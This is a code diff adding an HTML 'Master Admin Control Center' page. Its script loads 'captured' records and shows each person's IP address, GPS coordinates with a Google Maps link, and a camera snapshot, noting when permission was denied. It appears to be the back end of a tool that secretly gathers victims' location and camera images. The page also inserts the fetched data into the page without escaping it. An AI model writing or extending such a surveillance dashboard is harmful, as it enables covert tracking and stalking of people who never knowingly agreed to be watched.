@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Master Admin Control Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-950 text-white p-6 md:p-12">
+    <div class="max-w-6xl mx-auto">
+        <div class="flex justify-between items-center mb-8">
+            <div>
+                <h1 class="text-2xl font-bold text-indigo-400">Captured System Logs</h1>
+                <p class="text-slate-400 text-xs mt-1">Automatic 30-day retention policy active.</p>
+            </div>
+            <button onclick="loadLogs()" class="bg-indigo-600 hover:bg-indigo-500 text-xs font-semibold px-4 py-2.5 rounded-xl shadow transition">Refresh Database</button>
+        </div>
+
+        <div id="logs-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <!-- Dynamic data will render here -->
+        </div>
+    </div>
+
+    <script>
+        function loadLogs() {
+            fetch('/api/get-data')
+                .then(res => res.json())
+                .then(data => {
+                    const grid = document.getElementById("logs-grid");
+                    grid.innerHTML = "";
+
+                    if (Object.keys(data).length === 0) {
+                        grid.innerHTML = "<p class='text-slate-500 col-span-full text-center py-10'>No tracking data recorded yet.</p>";
+                        return;
+                    }
+
+                    for (let key in data) {
+                        let item = data[key];
+                        let card = document.createElement("div");
+                        card.className = "bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between";
+                        
+                        card.innerHTML = `
+                            <div>
+                                <div class="flex justify-between items-center mb-3">
+                                    <span class="text-[10px] bg-indigo-500/20 text-indigo-300 font-mono px-2 py-0.5 rounded">${item.id}</span>
+                                    <span class="text-[10px] text-slate-400">${new Date(item.timestamp).toLocaleString()}</span>
+                                </div>
+                                <div class="space-y-1.5 text-xs text-slate-300 mb-4 font-mono">
+                                    <p><strong>IP:</strong> ${item.ip}</p>
+                                    <p><strong>Lat:</strong> ${item.latitude}</p>
+                                    <p><strong>Lon:</strong> ${item.longitude}</p>
+                                    ${item.latitude !== 'Not Granted (Denied)' ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Google Maps ↗</a>` : ''}
+                                </div>
+                            </div>
+                            <div>
+                                ${item.image_base64 ? `<img src="${item.image_base64}" class="rounded-xl w-full h-44 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-32 rounded-xl flex items-center justify-center text-xs text-rose-400 border border-slate-800">Camera Permission Denied</div>'}
+                            </div>
+                        `;
+                        grid.appendChild(card);
+                    }
+                });
+        }
+        loadLogs();
+    </script>
+</body>
+</html>
+
